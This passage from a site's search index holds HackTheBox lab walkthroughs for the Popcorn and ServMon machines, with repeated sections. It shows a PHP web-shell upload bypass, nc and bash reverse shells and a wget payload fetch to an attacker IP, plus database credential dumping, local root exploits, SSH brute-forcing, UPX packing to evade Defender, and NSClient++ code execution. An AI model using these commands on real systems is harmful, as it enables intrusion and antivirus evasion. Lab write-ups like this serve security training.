10.10.14.5 443 -e /bin/sh' Original :: nc -nv 10.10.14.5 443 -e /bin/sh URL ENcoded :: nc%20-nv%2010.10.14.5%20443%20-e%20%2Fbin%2Fsh Open listener in the kali machine. sudo nc -nvlp 443 Execute payload curl 'http://10.10.10.6/torrent/upload/8509e36e3f62457bb3e33d07cd9a2440b83aa9fd.php?cmd=nc%20-nv%2010.10.14.5%20443%20-e%20%2Fbin%2Fsh' curl -G 'http://10.10.10.6/torrent/upload/8509e36e3f62457bb3e33d07cd9a2440b83aa9fd.php' --data-urlencode \"cmd=bash -c 'bash -i >& /dev/tcp/10.10.14.5/443 0>&1'\" Also upload php-reverse-shell.php to the server and execute it to get the reverse shell. curl 'http://10.10.10.6/torrent/upload/8509e36e3f62457bb3e33d07cd9a2440b83aa9fd.php?cmd=wget%2010.10.14.5%2Fphp-reverse-shell.php' curl 'http://10.10.10.6/torrent/upload/php-reverse-shell.php' Privilege Escalation Mysql Credential At /var/www/torrent/config.php , I got the clear text credential of mysql service. www-data@popcorn:/var/www/torrent$ cat config.php <snip> //Edit This For TORRENT HOSTER Database //database configuration $CFG->host = \"localhost\"; $CFG->dbName = \"torrenthoster\"; //db name $CFG->dbUserName = \"torrent\"; //db username $CFG->dbPassword = \"SuperSecret!!\"; //db password <snip> In there, let's dump data, get Admin's hash, ... www-data@popcorn:/var/www/torrent$ mysql -u torrent -p'SuperSecret!!' <snip> mysql> select * from users; +----+----------+----------------------------------+-----------+----------------------+---------------------+---------------------+ | id | userName | password | privilege | email | joined | lastconnect | +----+----------+----------------------------------+-----------+----------------------+---------------------+---------------------+ | 3 | Admin | d5bfedcee289e5e05b86daad8ee3e2e2 | admin | admin@yourdomain.com | 2007-01-06 21:12:46 | 2007-01-06 21:12:46 | | 5 | user | ee11cbb19052e40b07aac0ca060c23ee | user | user@local | 2021-04-01 19:03:10 | 2021-04-01 19:03:10 | +----+----------+----------------------------------+-----------+----------------------+---------------------+---------------------+ 2 rows in set (0.00 sec) Linux PAM 1.1.0 Poc code here HTB: Popcorn At george's home folder, I saw an interested folder named .cache containing file motd.legal-displayed . www-data@popcorn:/home/george$ ls -laR ls -laR total 868 ./.cache: <snip> -rw-r--r-- 1 george george 0 Mar 17 2017 motd.legal-displayed It is MOTD \u2014 Message of the Day . Using searchsploit to find some its exploit. \u250c\u2500\u2500(Hades\u327f10.10.14.5)-[2.8:26.0]~/walkthrough/hackthebox/popcorn \u2514\u2500$ searchsploit motd ---------------------------------------------------- --------------------------------- Exploit Title | Path ---------------------------------------------------- --------------------------------- Linux PAM 1.1.0 (Ubuntu 9.10/10.04) - MOTD File Tam | linux/local/14273.sh Linux PAM 1.1.0 (Ubuntu 9.10/10.04) - MOTD File Tam | linux/local/14339.sh MultiTheftAuto 0.5 patch 1 - Server Crash / MOTD De | windows/dos/1235.c ---------------------------------------------------- --------------------------------- Shellcodes: No Results I used exploit linux/local/14339.sh to get root in Popcorn server . www-data@popcorn:/tmp$ bash 14339.sh bash 14339.sh [*] Ubuntu PAM MOTD local root [*] SSH key set up [*] spawn ssh [+] owned: /etc/passwd [*] spawn ssh [+] owned: /etc/shadow [*] SSH key removed [+] Success! Use password toor to get root Password: toor root@popcorn:/tmp# whoami whoami root 'Full-Nelson.c Exploit Kernel Poc code here Also check kernel, the OS version is 2.6.31-14-generic-pae . www-data@popcorn:/home/george$ uname -a uname -a Linux popcorn 2.6.31-14-generic-pae #48-Ubuntu SMP Fri Oct 16 15:22:42 UTC 2009 i686 GNU/Linux www-data@popcorn:/home/george$ cat /etc/issue cat /etc/issue Ubuntu 9.10 \\n \\l Search exploit using searchsploit \u250c\u2500\u2500(Hades\u327f10.10.14.5)-[2.2:50.4]~ \u2514\u2500$ searchsploit Linux Kernel 2.6 Ubuntu ---------------------------------------------------- --------------------------------- Exploit Title | Path ---------------------------------------------------- --------------------------------- <snip> Linux Kernel 2.6.37 (RedHat / Ubuntu 10.04) - 'Full | linux/local/15704.c <snip> ---------------------------------------------------- --------------------------------- Shellcodes: No Results Tranfer exploit 15704.c to Popcorn server , compile and execute it, I have root. www-data@popcorn:/var/www$ gcc 15704.c -o 15704 gcc 15704.c -o 15704 www-data@popcorn:/var/www$ chmod +x 15704 chmod +x 15704 www-data@popcorn:/var/www$ ./15704 ./15704 [*] Resolving kernel addresses... [+] Resolved econet_ioctl to 0xf846a280 [+] Resolved econet_ops to 0xf846a360 [+] Resolved commit_creds to 0xc01645d0 [+] Resolved prepare_kernel_cred to 0xc01647d0 [*] Calculating target... [*] Failed to set Econet address. [*] Triggering payload... [*] Got root! # whoami whoami root #","title":"HTB Popcorn"},{"location":"walkthrough/hackthebox/Popcorn/index.html#hackthebox-popcorn","text":"Author: Hades Scripting here","title":"HackTheBox Popcorn"},{"location":"walkthrough/hackthebox/Popcorn/index.html#information-gathering","text":"","title":"Information Gathering"},{"location":"walkthrough/hackthebox/Popcorn/index.html#openning-services","text":"\u250c\u2500\u2500(Hades\u327f10.10.14.5)-[0.8:25.5]~/scripting \u2514\u2500$ sudo ./enum/all.sh 10.10.10.6 [sudo] password for kali: ### Port Scanning ############################ nmap -sS -p- --min-rate 1000 10.10.10.6 | grep ^[0-9] | cut -d '/' -f1 | tr '\\n' ',' | sed s/,$// [+] Openning ports: 22,80 ### Services Enumeration ############################ nmap -sC -sV -Pn 10.10.10.6 -p22,80 Starting Nmap 7.91 ( https://nmap.org ) at 2021-04-01 05:15 EDT Nmap scan report for 10.10.10.6 Host is up (0.25s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 5.1p1 Debian 6ubuntu2 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 1024 3e:c8:1b:15:21:15:50:ec:6e:63:bc:c5:6b:80:7b:38 (DSA) |_ 2048 aa:1f:79:21:b8:42:f4:8a:38:bd:b8:05:ef:1a:07:4d (RSA) 80/tcp open http Apache httpd 2.2.12 ((Ubuntu)) |_http-server-header: Apache/2.2.12 (Ubuntu) |_http-title: Site doesn't have a title (text/html). Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 15.14 seconds","title":"Openning Services"},{"location":"walkthrough/hackthebox/Popcorn/index.html#apache-httpd-2212","text":"List of the hidden with gobuster, I saw a special uri torrent which is Torrent Hoster. ### Web Enumeration (80) ############################ [+] Files and directories gobuster dir -k -u http://10.10.10.6:80 -w /usr/share/seclists/Discovery/Web-Content/common.txt <snip> =============================================================== /.hta (Status: 403) [Size: 282] /.htaccess (Status: 403) [Size: 287] /.htpasswd (Status: 403) [Size: 287] /cgi-bin/ (Status: 403) [Size: 286] /index (Status: 200) [Size: 177] /index.html (Status: 200) [Size: 177] /test (Status: 200) [Size: 47041] /torrent (Status: 301) [Size: 310] [--> http://10.10.10.6/torrent/] <snip>","title":"Apache httpd 2.2.12"},{"location":"walkthrough/hackthebox/Popcorn/index.html#torrent-hoster","text":"Torrent Hoster hosted at http://10.10.10.6/torrent/ . At http://10.10.10.6/torrent/users/index.php?mode=register , I sign up an account user:user and login. Using searsploit to find some exploits for Torrent hoster \u250c\u2500\u2500(Hades\u327f10.10.14.5)-[5.0:20.9]~ \u2514\u2500$ searchsploit torrent hoster ------------------------------------ --------------------------------- Exploit Title | Path ------------------------------------ --------------------------------- Torrent Hoster - Remount Upload | php/webapps/11746.txt ------------------------------------ --------------------------------- Shellcodes: No Results Try to using the web application, I download a torrent file, example kali-linux-2021.1-installer-amd64.iso.torrent and upload it to Torrent Hoster at http://10.10.10.6/torrent/torrents.php?mode=upload wget https://images.kali.org/kali-linux-2021.1-installer-amd64.iso.torrent At http://10.10.10.6/torrent/torrents.php?mode=details&id=8509e36e3f62457bb3e33d07cd9a2440b83aa9fd check Edit this torrent and view another page to update the torrent. In there, I can upload an image to Update Screenshot . At 10.10.10.6/torrent/edit.php?mode=edit&id=8509e36e3f62457bb3e33d07cd9a2440b83aa9fd , I download an image and update the screenshot File successfully uploaded","title":"Torrent Hoster"},{"location":"walkthrough/hackthebox/Popcorn/index.html#foothold","text":"","title":"Foothold"},{"location":"walkthrough/hackthebox/Popcorn/index.html#file-upload-bypass","text":"Poc code here File Upload Bypass Techniques Using exploit php/webapps/11746.txt and gain the foothold in the server. At the infor gathering, there are 2 way to upload file which are upload torrent file and upload screenshot file. At upload screenshot file , I try to upload a normal image and intercept the request with Burp Suite. Change the content in the image to <?php system($_GET['cmd']); ?> and change the file name extension to bymeacoffee.jpg.php Back to torrent file in the server and get the location of the backdoor. It is http://10.10.10.6/torrent/thumbnail.php?gd=2&src=./upload/8509e36e3f62457bb3e33d07cd9a2440b83aa9fd.php&maxw=96 . Follow the url, I can access to the upload folder at http://10.10.10.6/torrent/upload/","title":"File Upload Bypass"},{"location":"walkthrough/hackthebox/Popcorn/index.html#gain-reverse-shell","text":"Poc code here Execute the backdoor and get reverse shell. \u250c\u2500\u2500(Hades\u327f10.10.14.5)-[7.1:42.6]~/walkthrough/hackthebox/popcorn \u2514\u2500$ curl 'http://10.10.10.6/torrent/upload/8509e36e3f62457bb3e33d07cd9a2440b83aa9fd.php?cmd=id' uid=33(www-data) gid=33(www-data) groups=33(www-data) Url encode payload with hURL \u250c\u2500\u2500(Hades\u327f10.10.14.5)-[6.8:42.7]~ \u2514\u2500$ hURL -U 'nc -nv 10.10.14.5 443 -e /bin/sh' Original :: nc -nv 10.10.14.5 443 -e /bin/sh URL ENcoded :: nc%20-nv%2010.10.14.5%20443%20-e%20%2Fbin%2Fsh Open listener in the kali machine. sudo nc -nvlp 443 Execute payload curl 'http://10.10.10.6/torrent/upload/8509e36e3f62457bb3e33d07cd9a2440b83aa9fd.php?cmd=nc%20-nv%2010.10.14.5%20443%20-e%20%2Fbin%2Fsh' curl -G 'http://10.10.10.6/torrent/upload/8509e36e3f62457bb3e33d07cd9a2440b83aa9fd.php' --data-urlencode \"cmd=bash -c 'bash -i >& /dev/tcp/10.10.14.5/443 0>&1'\" Also upload php-reverse-shell.php to the server and execute it to get the reverse shell. curl 'http://10.10.10.6/torrent/upload/8509e36e3f62457bb3e33d07cd9a2440b83aa9fd.php?cmd=wget%2010.10.14.5%2Fphp-reverse-shell.php' curl 'http://10.10.10.6/torrent/upload/php-reverse-shell.php'","title":"Gain Reverse Shell"},{"location":"walkthrough/hackthebox/Popcorn/index.html#privilege-escalation","text":"","title":"Privilege Escalation"},{"location":"walkthrough/hackthebox/Popcorn/index.html#mysql-credential","text":"At /var/www/torrent/config.php , I got the clear text credential of mysql service. www-data@popcorn:/var/www/torrent$ cat config.php <snip> //Edit This For TORRENT HOSTER Database //database configuration $CFG->host = \"localhost\"; $CFG->dbName = \"torrenthoster\"; //db name $CFG->dbUserName = \"torrent\"; //db username $CFG->dbPassword = \"SuperSecret!!\"; //db password <snip> In there, let's dump data, get Admin's hash, ... www-data@popcorn:/var/www/torrent$ mysql -u torrent -p'SuperSecret!!' <snip> mysql> select * from users; +----+----------+----------------------------------+-----------+----------------------+---------------------+---------------------+ | id | userName | password | privilege | email | joined | lastconnect | +----+----------+----------------------------------+-----------+----------------------+---------------------+---------------------+ | 3 | Admin | d5bfedcee289e5e05b86daad8ee3e2e2 | admin | admin@yourdomain.com | 2007-01-06 21:12:46 | 2007-01-06 21:12:46 | | 5 | user | ee11cbb19052e40b07aac0ca060c23ee | user | user@local | 2021-04-01 19:03:10 | 2021-04-01 19:03:10 | +----+----------+----------------------------------+-----------+----------------------+---------------------+---------------------+ 2 rows in set (0.00 sec)","title":"Mysql Credential"},{"location":"walkthrough/hackthebox/Popcorn/index.html#linux-pam-110","text":"Poc code here HTB: Popcorn At george's home folder, I saw an interested folder named .cache containing file motd.legal-displayed . www-data@popcorn:/home/george$ ls -laR ls -laR total 868 ./.cache: <snip> -rw-r--r-- 1 george george 0 Mar 17 2017 motd.legal-displayed It is MOTD \u2014 Message of the Day . Using searchsploit to find some its exploit. \u250c\u2500\u2500(Hades\u327f10.10.14.5)-[2.8:26.0]~/walkthrough/hackthebox/popcorn \u2514\u2500$ searchsploit motd ---------------------------------------------------- --------------------------------- Exploit Title | Path ---------------------------------------------------- --------------------------------- Linux PAM 1.1.0 (Ubuntu 9.10/10.04) - MOTD File Tam | linux/local/14273.sh Linux PAM 1.1.0 (Ubuntu 9.10/10.04) - MOTD File Tam | linux/local/14339.sh MultiTheftAuto 0.5 patch 1 - Server Crash / MOTD De | windows/dos/1235.c ---------------------------------------------------- --------------------------------- Shellcodes: No Results I used exploit linux/local/14339.sh to get root in Popcorn server . www-data@popcorn:/tmp$ bash 14339.sh bash 14339.sh [*] Ubuntu PAM MOTD local root [*] SSH key set up [*] spawn ssh [+] owned: /etc/passwd [*] spawn ssh [+] owned: /etc/shadow [*] SSH key removed [+] Success! Use password toor to get root Password: toor root@popcorn:/tmp# whoami whoami root","title":"Linux PAM 1.1.0"},{"location":"walkthrough/hackthebox/Popcorn/index.html#full-nelsonc-exploit-kernel","text":"Poc code here Also check kernel, the OS version is 2.6.31-14-generic-pae . www-data@popcorn:/home/george$ uname -a uname -a Linux popcorn 2.6.31-14-generic-pae #48-Ubuntu SMP Fri Oct 16 15:22:42 UTC 2009 i686 GNU/Linux www-data@popcorn:/home/george$ cat /etc/issue cat /etc/issue Ubuntu 9.10 \\n \\l Search exploit using searchsploit \u250c\u2500\u2500(Hades\u327f10.10.14.5)-[2.2:50.4]~ \u2514\u2500$ searchsploit Linux Kernel 2.6 Ubuntu ---------------------------------------------------- --------------------------------- Exploit Title | Path ---------------------------------------------------- --------------------------------- <snip> Linux Kernel 2.6.37 (RedHat / Ubuntu 10.04) - 'Full | linux/local/15704.c <snip> ---------------------------------------------------- --------------------------------- Shellcodes: No Results Tranfer exploit 15704.c to Popcorn server , compile and execute it, I have root. www-data@popcorn:/var/www$ gcc 15704.c -o 15704 gcc 15704.c -o 15704 www-data@popcorn:/var/www$ chmod +x 15704 chmod +x 15704 www-data@popcorn:/var/www$ ./15704 ./15704 [*] Resolving kernel addresses... [+] Resolved econet_ioctl to 0xf846a280 [+] Resolved econet_ops to 0xf846a360 [+] Resolved commit_creds to 0xc01645d0 [+] Resolved prepare_kernel_cred to 0xc01647d0 [*] Calculating target... [*] Failed to set Econet address. [*] Triggering payload... [*] Got root! # whoami whoami root #","title":"'Full-Nelson.c Exploit Kernel"},{"location":"walkthrough/hackthebox/ServMon/index.html","text":"HackTheBox ServMon Author: Hades Scripting here Information Gathering Openning Services ### Port Scanning ############################ nmap -sS -Pn -p- --min-rate 1000 10.10.10.184 Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower. [+] Openning ports: 21,22,80,135,139,445,5040,5666,6063,6699,7680,8443,49664,49665,49666,49667,49668,49669,49670 ### Services Enumeration ############################ nmap -sC -sV -Pn 10.10.10.184 -p21,22,80,135,139,445,5040,5666,6063,6699,7680,8443,49664,49665,49666,49667,49668,49669,49670 Starting Nmap 7.91 ( https://nmap.org ) at 2021-04-09 12:59 +07 Nmap scan report for 10.10.10.184 Host is up (0.27s latency). PORT STATE SERVICE VERSION 21/tcp open ftp Microsoft ftpd | ftp-anon: Anonymous FTP login allowed (FTP code 230) |_01-18-20 12:05PM <DIR> Users | ftp-syst: |_ SYST: Windows_NT 22/tcp open ssh OpenSSH for_Windows_7.7 (protocol 2.0) | ssh-hostkey: | 2048 b9:89:04:ae:b6:26:07:3f:61:89:75:cf:10:29:28:83 (RSA) | 256 71:4e:6c:c0:d3:6e:57:4f:06:b8:95:3d:c7:75:57:53 (ECDSA) |_ 256 15:38:bd:75:06:71:67:7a:01:17:9c:5c:ed:4c:de:0e (ED25519) 80/tcp open http | fingerprint-strings: | GetRequest, HTTPOptions, RTSPRequest: | HTTP/1.1 200 OK | Content-type: text/html | Content-Length: 340 | Connection: close | AuthInfo: | <!DOCTYPE html PUBLIC \"-//W3C//DTD XHTML 1.0 Transitional//EN\" \"http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd\"> | <html xmlns=\"http://www.w3.org/1999/xhtml\"> | <head> | <title></title> | <script type=\"text/javascript\"> | window.location.href = \"Pages/login.htm\"; | </script> | </head> | <body> | </body> | </html> | NULL: | HTTP/1.1 408 Request Timeout | Content-type: text/html | Content-Length: 0 | Connection: close |_ AuthInfo: |_http-title: Site doesn't have a title (text/html). 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 445/tcp open microsoft-ds? 5040/tcp open unknown 5666/tcp open tcpwrapped 6063/tcp open x11? 6699/tcp open napster? 7680/tcp open pando-pub? 8443/tcp open ssl/https-alt | fingerprint-strings: | FourOhFourRequest, HTTPOptions, RTSPRequest, SIPOptions: | HTTP/1.1 404 | Content-Length: 18 | Document not found | GetRequest: | HTTP/1.1 302 | Content-Length: 0 | Location: /index.html | workers |_ jobs | http-title: NSClient++ |_Requested resource was /index.html | ssl-cert: Subject: commonName=localhost | Not valid before: 2020-01-14T13:24:20 |_Not valid after: 2021-01-13T13:24:20 |_ssl-date: TLS randomness does not represent time 49664/tcp open msrpc Microsoft Windows RPC 49665/tcp open msrpc Microsoft Windows RPC 49666/tcp open msrpc Microsoft Windows RPC 49667/tcp open msrpc Microsoft Windows RPC 49668/tcp open msrpc Microsoft Windows RPC 49669/tcp open msrpc Microsoft Windows RPC 49670/tcp open msrpc Microsoft Windows RPC 2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service : ==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)============== <snip> Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: |_clock-skew: 1m21s | smb2-security-mode: | 2.02: |_ Message signing enabled but not required | smb2-time: | date: 2021-04-09T06:03:58 |_ start_date: N/A Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 204.91 seconds Microsoft ftpd 21 Port 21 is ftpd service allowed anonymous access. \u250c\u2500\u2500(Hades\u327f10.10.14.5)-[0.7:21.2]~/walkthrough/hackthebox/servmon \u2514\u2500$ ftp 10.10.10.184 Connected to 10.10.10.184. 220 Microsoft FTP Service Name (10.10.10.184:kali): anonymous 331 Anonymous access allowed, send identity (e-mail name) as password. Password: 230 User logged in. I access to ftp server. This folder contain 2 Users Nadine and Nathan . ftp> ls Users 200 PORT command successful. 125 Data connection already open; Transfer starting. 01-18-20 12:06PM <DIR> Nadine 01-18-20 12:08PM <DIR> Nathan 226 Transfer complete. Checking Nadine folder, I got Confidential.txt file. Poc code here ftp> ls Nadine 200 PORT command successful. 125 Data connection already open; Transfer starting. 01-18-20 12:08PM 174 Confidential.txt 226 Transfer complete. Download file Confidential.txt and this is a mail from Nadine. The important info is Passwords.txt file on your Desktop . \u250c\u2500\u2500(Hades\u327f10.10.14.5)-[0.7:21.1]~/walkthrough/hackthebox/servmon \u2514\u2500$ cat Confidential.txt Nathan, I left your Passwords.txt file on your Desktop. Please remove this once you have edited it yourself and place it back into the secure folder. Regards Nadine Checking Nathan folder, I got Notes to do.txt file. Poc code here ftp> ls Nathan 200 PORT command successful. 125 Data connection already open; Transfer starting. 01-18-20 12:10PM 186 Notes to do.txt 226 Transfer complete. File Notes to do.txt said that, Admin complete change password for NVMS and lock down access to NSClient. \u250c\u2500\u2500(Hades\u327f10.10.14.5)-[0.7:21.1]~/walkthrough/hackthebox/servmon \u2514\u2500$ cat Notes\\ to\\ do.txt 1) Change the password for NVMS - Complete 2) Lock down the NSClient Access - Complete 3) Upload the passwords 4) Remove public access to NVMS 5) Place the secret files in SharePoint NVMS 1000 80 The home page is NVMS 1000 . Searching public exploit using searchsploit . \u250c\u2500\u2500(Hades\u327f10.10.14.4)-[5.0:22.5]~/walkthrough/hackthebox/servmon \u2514\u2500$ searchsploit nvms 1000 ------------------------------------------------------------ --------------------------------- Exploit Title | Path ------------------------------------------------------------ --------------------------------- NVMS 1000 - Directory Traversal | hardware/webapps/47774.txt TVT NVMS 1000 - Directory Traversal | hardware/webapps/48311.py ------------------------------------------------------------ --------------------------------- Shellcodes: No Results Follow exploit hardware/webapps/47774.txt , I use BurpSuite to sent Traversal payload and got the contain of file windows/win.ini Poc code here Server Message Block Enum SMB service at port 139 and 445, But server is not allow access. ### SMB Enumeration (445) ############################ smbmap -H 10.10.10.184 -u guest [!] Authentication error on 10.10.10.184 smbclient -L 10.10.10.184 session setup failed: NT_STATUS_ACCESS_DENIED NSClient++ 8443 The home page is NSClient++ . Searching public exploit using searchsploit . I got 2 exploit. \u250c\u2500\u2500(Hades\u327f10.10.14.4)-[5.5:37.1]~/walkthrough/hackthebox/servmon \u2514\u2500$ searchsploit NSClient ------------------------------------------------------------ --------------------------------- Exploit Title | Path ------------------------------------------------------------ --------------------------------- NSClient++ 0.5.2.35 - Authenticated Remote Code Execution | json/webapps/48360.txt NSClient++ 0.5.2.35 - Privilege Escalation | windows/local/46802.txt ------------------------------------------------------------ --------------------------------- Shellcodes: No Results Foothold Direc Travel SSH Credential Poc code here At port 21, I know that User Nadine left file Password.txt at User Nathan's Desktop folder. Full directory is Users/Nathan/Desktop/Passwords.txt . Using NVMS 1000 - Directory Traversal hardware/webapps/47774.txt at port 80, I add directory of Password.txt to read it. I have a list of password, let's save it to file and using hydra to brute force in ssh service. First, with user nathan, there is no password found. \u250c\u2500\u2500(Hades\u327f10.10.14.4)-[5.8:35.8]~/walkthrough/hackthebox/servmon \u2514\u2500$ hydra -l nathan -P Password.txt 10.10.10.184 -t 4 ssh <snip> [DATA] attacking ssh://10.10.10.184:22/ 1 of 1 target completed, 0 valid password found <snip> Second, I try list password with user nadine and the password L1k3B1gBut7s@W0rk was found. \u250c\u2500\u2500(Hades\u327f10.10.14.4)-[5.8:35.7]~/walkthrough/hackthebox/servmon \u2514\u2500$ hydra -l nadine -P Password.txt 10.10.10.184 -t 4 ssh <snip> [DATA] attacking ssh://10.10.10.184:22/ [22][ssh] host: 10.10.10.184 login: nadine password: L1k3B1gBut7s@W0rk 1 of 1 target successfully completed, 1 valid password found <snip> SSH to server using knowed credential 'nadine:L1k3B1gBut7s@W0rk', I got user access. \u250c\u2500\u2500(Hades\u327f10.10.14.4)-[5.8:35.8]~/walkthrough/hackthebox/servmon \u2514\u2500$ ssh nadine@10.10.10.184 nadine@10.10.10.184's password: Microsoft Windows [Version 10.0.18363.752] (c) 2019 Microsoft Corporation. All rights reserved. nadine@SERVMON C:\\Users\\Nadine>whoami servmon\\nadine Privilege Escalation Follow exploit NSClient++ 0.5.2.35 - Authenticated Remote Code Execution windows/local/46802.txt Poc code here Grab web administrator password open c:\\program files\\nsclient++\\nsclient.ini or run the following that is instructed when you select forget password nadine@SERVMON c:\\Temp>cd \"C:\\Program Files\\NSClient++\" nadine@SERVMON C:\\Program Files\\NSClient++>nscp web -- password --display Current password: ew2x6SsGTxjRwXOT Login and enable following modules including enable at startup and save configuration - CheckExternalScripts - Scheduler I login to NSClient with password ew2x6SsGTxjRwXOT but I still got 403. At Notes to do.txt , I confirmed that admin was lock down access to NSClient from public nerwork. SSH Local Port Forwarding Using SSH local port forwarding to connect NSClient from localhost. \u250c\u2500\u2500(Hades\u327f10.10.14.4)-[4.4:35.9]~/walkthrough/hackthebox/servmon \u2514\u2500$ ssh -L 8443:127.0.0.1:8443 nadine@10.10.10.184 nadine@10.10.10.184's password: Microsoft Windows [Version 10.0.18363.752] (c) 2019 Microsoft Corporation. All rights reserved. nadine@SERVMON C:\\Users\\Nadine> Access to NSClient at https://127.0.0.1:8443/index.html#/settings . I saw the External Script and Scheduler was enabled. Download nc.exe and shell.bat to c:\\temp from attacking machine Next step, I sent file nc.exe to Windows machine, but this file cannot execute and will be delete after downloading. An anti-virus have been installed. Poc code here nadine@SERVMON C:\\Users\\Nadine>cd c:\\temp nadine@SERVMON c:\\Temp>powershell wget 10.10.14.4/nc.exe -outfile nc.exe nadine@SERVMON c:\\Temp>nc.exe The system cannot execute the specified program. Simple Bypass Defender Simple packed file nc.exe with UPX. \u250c\u2500\u2500(Hades\u327f10.10.14.4)-[5.4:36.9]~/walkthrough/hackthebox/servmon \u2514\u2500$ upx -9 nc.exe Ultimate Packer for eXecutables Copyright (C) 1996 - 2020 UPX 3.96 Markus Oberhumer, Laszlo Molnar & John Reiser Jan 23rd 2020 File size Ratio Format Name -------------------- ------ ----------- ----------- 59392 -> 29696 50.00% win32/pe nc.exe Packed 1 file. Download file nc.exe again and try to execute it. Now, I can run nc.exe to create reverse shell later. nadine@SERVMON c:\\Temp>powershell wget 10.10.14.4/nc.exe -outfile nc.exe nadine@SERVMON c:\\Temp>nc.exe Cmd line: Download file shell.bat nadine@SERVMON c:\\Temp>powershell wget 10.10.14.4/shell.bat -outfile shell.bat nadine@SERVMON c:\\Temp>shell.bat Setup listener on attacking machine After run file shell.bat, I got reverse shell to confirm this work, let's do final step to get admin shell. \u250c\u2500\u2500(Hades\u327f10.10.14.4)-[5.4:36.9]~/walkthrough/hackthebox/servmon \u2514\u2500$ sudo nc -nvlp 443 listening on [any] 443 ... connect to [10.10.14.4] from (UNKNOWN) [10.10.10.184] 49681 Microsoft Windows [Version 10.0.18363.752] (c) 2019 Microsoft Corporation. All rights reserved. nadine@SERVMON c:\\Temp> NSClient Script Exploitation Using exploit json/webapps/48360.txt in python file 48360.py and run it with knowed info. Poc code here \u250c\u2500\u2500(Hades\u327f10.10.14.4)-[3.5:41.0]~/walkthrough/hackthebox/servmon \u2514\u2500$ python 48360.py -t 127.0.0.1 -P 8443 -p ew2x6SsGTxjRwXOT -c 'c:\\Temp\\shell.bat' [!] Targeting base URL https://127.0.0.1:8443 [!] Obtaining Authentication Token . . . [+] Got auth token: frAQBc8Wsa1xVPfvJcrgRYwTiizs2trQ [!] Enabling External Scripts Module . . . [!] Configuring Script with Specified Payload . . . [+] Added External Script (name: OQvYiexxJhGMF) [!] Saving Configuration . . . [!] Reloading Application . . . [!] Waiting for Application to reload . . . [!] Obtaining Authentication Token . . . [+] Got auth token: frAQBc8Wsa1xVPfvJcrgRYwTiizs2trQ [!] Triggering payload, should execute shortly . . . [!] Timeout exceeded. Assuming your payload executed . . . After wait a long time, I have system shell in the listener. \u250c\u2500\u2500(Hades\u327f10.10.14.4)-[3.8:37.7]~ \u2514\u2500$ sudo nc -nvlp 443 connect to [10.10.14.4] from (UNKNOWN) [10.10.10.184] 51227 Microsoft Windows [Version 10.0.18363.752] (c) 2019 Microsoft Corporation. All rights reserved. C:\\Program Files\\NSClient++>whoami whoami nt authority\\system C:\\Program Files\\NSClient++>","title":"HTB ServMon"},{"location":"walkthrough/hackthebox/ServMon/index.html#hackthebox-servmon","text":"Author: Hades Scripting here","title":"HackTheBox ServMon"},{"location":"walkthrough/hackthebox/ServMon/index.html#information-gathering","text":"","title":"Information Gathering"},{"location":"walkthrough/hackthebox/ServMon/index.html#openning-services","text":"### Port Scanning ############################ nmap -sS -Pn -p- --min-rate 1000 10.10.10.184 Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower. [+] Openning ports: 21,22,80,135,139,445,5040,5666,6063,6699,7680,8443,49664,49665,49666,49667,49668,49669,49670 ### Services Enumeration ############################ nmap -sC -sV -Pn 10.10.10.184 -p21,22,80,135,139,445,5040,5666,6063,6699,7680,8443,49664,49665,49666,49667,49668,49669,49670 Starting Nmap 7.91 ( https://nmap.org ) at 2021-04-09 12:59 +07 Nmap scan report for 10.10.10.184 Host is up (0.27s latency). PORT STATE SERVICE VERSION 21/tcp open ftp Microsoft ftpd | ftp-anon: Anonymous FTP login allowed (FTP code 230) |_01-18-20 12:05PM <DIR> Users | ftp-syst: |_ SYST: Windows_NT 22/tcp open ssh OpenSSH for_Windows_7.7 (protocol 2.0) | ssh-hostkey: | 2048 b9:89:04:ae:b6:26:07:3f:61:89:75:cf:10:29:28:83 (RSA) | 256 71:4e:6c:c0:d3:6e:57:4f:06:b8:95:3d:c7:75:57:53 (ECDSA) |_ 256 15:38:bd:75:06:71:67:7a:01:17:9c:5c:ed:4c:de:0e (ED25519) 80/tcp open http | fingerprint-strings: | GetRequest, HTTPOptions, RTSPRequest: | HTTP/1.1 200 OK | Content-type: text/html | Content-Length: 340 | Connection: close | AuthInfo: | <!DOCTYPE html PUBLIC \"-//W3C//DTD XHTML 1.0 Transitional//EN\" \"http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd\"> | <html xmlns=\"http://www.w3.org/1999/xhtml\"> | <head> | <title></title> | <script type=\"text/javascript\"> | window.location.href = \"Pages/login.htm\"; | </script> | </head> | <body> | </body> | </html> | NULL: | HTTP/1.1 408 Request Timeout | Content-type: text/html | Content-Length: 0 | Connection: close |_ AuthInfo: |_http-title: Site doesn't have a title (text/html). 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 445/tcp open microsoft-ds? 5040/tcp open unknown 5666/tcp open tcpwrapped 6063/tcp open x11? 6699/tcp open napster? 7680/tcp open pando-pub? 8443/tcp open ssl/https-alt | fingerprint-strings: | FourOhFourRequest, HTTPOptions, RTSPRequest, SIPOptions: | HTTP/1.1 404 | Content-Length: 18 | Document not found | GetRequest: | HTTP/1.1 302 | Content-Length: 0 | Location: /index.html | workers |_ jobs | http-title: NSClient++ |_Requested resource was /index.html | ssl-cert: Subject: commonName=localhost | Not valid before: 2020-01-14T13:24:20 |_Not valid after: 2021-01-13T13:24:20 |_ssl-date: TLS randomness does not represent time 49664/tcp open msrpc Microsoft Windows RPC 49665/tcp open msrpc Microsoft Windows RPC 49666/tcp open msrpc Microsoft Windows RPC 49667/tcp open msrpc Microsoft Windows RPC 49668/tcp open msrpc Microsoft Windows RPC 49669/tcp open msrpc Microsoft 